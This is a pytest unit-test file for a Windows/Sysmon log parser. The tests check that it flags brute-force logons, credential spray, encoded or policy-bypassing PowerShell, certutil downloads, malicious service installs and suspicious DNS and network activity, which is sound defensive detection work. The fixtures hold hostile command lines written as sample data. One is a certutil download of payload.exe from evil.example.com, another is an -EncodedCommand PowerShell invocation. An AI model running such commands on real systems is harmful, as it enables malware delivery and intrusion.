"""Unit tests for the Windows / Sysmon log parser."""

import json

import pytest

from integrations.windows_logs.parser import normalise_record, parse_windows_logs


# ── helpers ──────────────────────────────────────────────────────────────────

def _encode(events: list) -> bytes:
    return json.dumps(events).encode()


def _make_logon_failure(n: int, user: str = "bob", ip: str = "10.0.0.1") -> list:
    return [
        {
            "EventID": "4625",
            "TimeCreated": f"2024-01-01T00:00:{i:02d}.000Z",
            "Computer": "WS1",
            "AccountName": user,
            "IpAddress": ip,
        }
        for i in range(n)
    ]


# ── normalise_record ─────────────────────────────────────────────────────────

def test_normalise_field_aliases():
    raw = {
        "EventID": "4624",
        "TimeCreated": "2024-01-01T00:00:00Z",
        "Computer": "PC1",
        "AccountName": "alice",
    }
    result = normalise_record(raw)
    assert result["event_id"] == "4624"
    assert result["host"] == "PC1"
    assert result["user"] == "alice"
    assert result["timestamp"] == "2024-01-01T00:00:00Z"


def test_normalise_sysmon_field_aliases():
    raw = {
        "EventID": "1",
        "TimeCreated": "2024-01-01T00:00:00Z",
        "Computer": "WS1",
        "User": "CORP\\alice",
        "Image": "C:\\Windows\\System32\\powershell.exe",
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "CommandLine": "powershell.exe -enc abc",
    }
    result = normalise_record(raw)
    assert result["process_name"] == "C:\\Windows\\System32\\powershell.exe"
    assert result["parent_process_name"] == "C:\\Windows\\System32\\cmd.exe"
    assert result["command_line"] == "powershell.exe -enc abc"


# ── parse_windows_logs — basic ────────────────────────────────────────────────

def test_empty_json_array_returns_no_events():
    normalised, findings = parse_windows_logs(b"[]", "test.json")
    assert normalised == []
    assert findings == []


def test_single_benign_event_no_findings():
    events = [{"EventID": "4634", "TimeCreated": "2024-01-01T00:00:00Z", "Computer": "PC1"}]
    normalised, findings = parse_windows_logs(_encode(events), "test.json")
    assert len(normalised) == 1
    assert findings == []


def test_csv_format_parsed_correctly():
    csv_content = b"EventID,TimeCreated,Computer,AccountName\n4624,2024-01-01T00:00:00Z,PC1,alice\n"
    normalised, _ = parse_windows_logs(csv_content, "events.csv")
    assert len(normalised) == 1
    assert normalised[0]["event_id"] == "4624"
    assert normalised[0]["host"] == "PC1"


# ── brute force detection ─────────────────────────────────────────────────────

def test_brute_force_triggers_at_fifth_failure():
    events = _make_logon_failure(5)
    _, findings = parse_windows_logs(_encode(events), "test.json")
    brute = [f for f in findings if "brute force" in f["description"].lower()]
    assert len(brute) == 1
    assert brute[0]["severity"] == "high"


def test_four_failures_no_brute_force_finding():
    events = _make_logon_failure(4)
    _, findings = parse_windows_logs(_encode(events), "test.json")
    brute = [f for f in findings if "brute force" in f["description"].lower()]
    assert brute == []


def test_brute_force_includes_user_and_ip():
    events = _make_logon_failure(5, user="jsmith", ip="10.10.50.201")
    _, findings = parse_windows_logs(_encode(events), "test.json")
    brute = findings[0]["description"]
    assert "jsmith" in brute
    assert "10.10.50.201" in brute


# ── credential spray success ──────────────────────────────────────────────────

def test_successful_logon_after_failures_is_flagged():
    events = _make_logon_failure(4) + [
        {
            "EventID": "4624",
            "TimeCreated": "2024-01-01T00:00:10.000Z",
            "Computer": "WS1",
            "AccountName": "bob",
            "IpAddress": "10.0.0.1",
        }
    ]
    _, findings = parse_windows_logs(_encode(events), "test.json")
    spray = [f for f in findings if "credential spray" in f["description"].lower()]
    assert len(spray) == 1
    assert spray[0]["severity"] == "high"


def test_successful_logon_no_prior_failures_not_flagged():
    events = [
        {
            "EventID": "4624",
            "TimeCreated": "2024-01-01T00:00:00.000Z",
            "Computer": "WS1",
            "AccountName": "alice",
            "IpAddress": "10.0.0.2",
        }
    ]
    _, findings = parse_windows_logs(_encode(events), "test.json")
    spray = [f for f in findings if "credential spray" in f["description"].lower()]
    assert spray == []


# ── PowerShell encoded command ────────────────────────────────────────────────

def test_encoded_powershell_triggers_high_finding():
    events = [
        {
            "EventID": "4688",
            "TimeCreated": "2024-01-01T00:00:00.000Z",
            "Computer": "WS1",
            "AccountName": "alice",
            "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": (
                "powershell.exe -NoProfile -ExecutionPolicy Bypass "
                "-EncodedCommand aQBlAHgAIAAoAE4AZQAu"
            ),
        }
    ]
    _, findings = parse_windows_logs(_encode(events), "test.json")
    enc_ps = [f for f in findings if "encoded command" in f["description"].lower()]
    assert len(enc_ps) >= 1
    assert enc_ps[0]["severity"] == "high"


def test_powershell_bypass_flags_without_encoding_is_medium():
    events = [
        {
            "EventID": "4688",
            "TimeCreated": "2024-01-01T00:00:00.000Z",
            "Computer": "WS1",
            "AccountName": "alice",
            "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -nop -NonInteractive -ExecutionPolicy Bypass",
        }
    ]
    _, findings = parse_windows_logs(_encode(events), "test.json")
    bypass = [f for f in findings if "bypass" in f["description"].lower()]
    assert len(bypass) >= 1
    assert bypass[0]["severity"] == "medium"


# ── certutil download ─────────────────────────────────────────────────────────

def test_certutil_urlcache_triggers_high_finding():
    events = [
        {
            "EventID": "4688",
            "TimeCreated": "2024-01-01T00:00:00.000Z",
            "Computer": "WS1",
            "AccountName": "alice",
            "NewProcessName": "C:\\Windows\\System32\\certutil.exe",
            "CommandLine": (
                "certutil.exe -urlcache -split -f "
                "http://evil.example.com/payload.exe C:\\temp\\payload.exe"
            ),
        }
    ]
    _, findings = parse_windows_logs(_encode(events), "test.json")
    certutil_findings = [f for f in findings if "certutil" in f["description"].lower()]
    assert len(certutil_findings) >= 1
    assert certutil_findings[0]["severity"] == "high"


# ── service install ───────────────────────────────────────────────────────────

def test_service_install_triggers_high_finding():
    events = [
        {
            "EventID": "7045",
            "TimeCreated": "2024-01-01T00:00:00.000Z",
            "Computer": "WS1",
            "ServiceName": "EvilPersistSvc",
            "ServiceFileName": "C:\\ProgramData\\evil.exe",
            "Channel": "System",
        }
    ]
    _, findings = parse_windows_logs(_encode(events), "test.json")
    svc = [f for f in findings if "service" in f["description"].lower()]
    assert len(svc) >= 1
    assert svc[0]["severity"] == "high"


# ── sysmon network connection ─────────────────────────────────────────────────

def test_sysmon_powershell_network_connection_flagged():
    events = [
        {
            "EventID": "3",
            "TimeCreated": "2024-01-01T00:00:00.000Z",
            "Computer": "WS1",
            "User": "CORP\\alice",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "DestinationIp": "192.168.1.200",
            "DestinationPort": "443",
            "Channel": "Microsoft-Windows-Sysmon/Operational",
        }
    ]
    _, findings = parse_windows_logs(_encode(events), "sysmon.json")
    c2 = [f for f in findings if "network connection" in f["description"].lower()]
    assert len(c2) >= 1
    assert c2[0]["severity"] == "high"


# ── DNS query ─────────────────────────────────────────────────────────────────

def test_long_dns_query_triggers_medium_finding():
    long_domain = "a" * 55 + ".example.com"
    events = [
        {
            "EventID": "22",
            "TimeCreated": "2024-01-01T00:00:00.000Z",
            "Computer": "WS1",
            "QueryName": long_domain,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
        }
    ]
    _, findings = parse_windows_logs(_encode(events), "sysmon.json")
    dns = [f for f in findings if "dns" in f["description"].lower()]
    assert len(dns) >= 1
    assert dns[0]["severity"] == "medium"


def test_short_dns_query_no_finding():
    events = [
        {
            "EventID": "22",
            "TimeCreated": "2024-01-01T00:00:00.000Z",
            "Computer": "WS1",
            "QueryName": "microsoft.com",
        }
    ]
    _, findings = parse_windows_logs(_encode(events), "sysmon.json")
    dns = [f for f in findings if "dns" in f["description"].lower()]
    assert dns == []
